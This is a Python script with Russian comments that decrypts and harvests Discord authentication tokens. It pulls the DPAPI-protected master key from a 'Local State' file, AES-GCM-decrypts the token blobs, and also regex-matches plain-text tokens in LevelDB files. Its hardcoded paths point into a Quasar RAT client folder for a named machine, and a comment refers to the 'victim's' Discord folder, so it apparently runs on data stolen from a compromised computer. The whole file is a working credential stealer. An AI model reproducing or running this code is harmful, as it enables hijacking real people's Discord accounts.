import os
import re
import base64
import json
import glob
import win32crypt
from Crypto.Cipher import AES

# --- 1. Расшифровка AES-GCM (для новых версий Discord) ---
def decrypt_token(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode() # remove suffix bytes
        return decrypted_pass
    except:
        return ""

# --- 2. Получаем мастер-ключ ---
def get_master_key(local_state_path):
    if not os.path.exists(local_state_path):
        print(f"[-] Файл Local State не найден по пути: {local_state_path}")
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:] # Срезаем префикс DPAPI
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

# --- 3. Сканируем файлы ---
def extract_tokens(leveldb_path, local_state_path):
    master_key = get_master_key(local_state_path)
    if not master_key:
        return []

    tokens = set()
    
    # Ищем во всех ldb и log файлах в папке
    files = glob.glob(os.path.join(leveldb_path, "*.ldb")) + glob.glob(os.path.join(leveldb_path, "*.log"))
    
    for file in files:
        with open(file, "rb") as f:
            content = f.read()
            
            # 1. Поиск зашифрованных токенов (v10/v20)
            for match in re.finditer(b"dQw4w9WgXcQ", content):
                start = match.start()
                # Берем кусок длиной примерно 120 байт (хватает для токена)
                encrypted_data = content[start:start+120] 
                decrypted = decrypt_token(encrypted_data, master_key)
                if decrypted and re.match(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", decrypted):
                    tokens.add(decrypted)
                    
            # 2. Поиск plain-text токенов (старый формат)
            plain_matches = re.findall(rb"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
            for pm in plain_matches:
                tokens.add(pm.decode())
                
    return tokens

# --- 4. Запуск ---
# УКАЖИ СВОИ ПУТИ
leveldb_path = r"G:\quasar\bin\Release\net452\Clients\TANVEER@GTURBO_562A590"  # Путь к папке с ldb файлами (где ты сейчас)
local_state_path = r"G:\quasar\bin\Release\net452\Clients\TANVEER@GTURBO_562A590\Local State" # Тебе нужен файл Local State. Если его нет в этой папке, найди его в папке Discord жертвы.

print(f"[*] Сканирую папку: {leveldb_path}")
found = extract_tokens(leveldb_path, local_state_path)

if found:
    print("\n[+] НАЙДЕНЫ ТОКЕНЫ:")
    for t in found:
        print(t)
else:
    print("\n[-] Токены не найдены.")
    print("Причина 1: Нет файла 'Local State' рядом с ldb файлами (скрипт не знает ключ).")
    print("Причина 2: В файлах нет зашифрованных токенов (v10/v20).")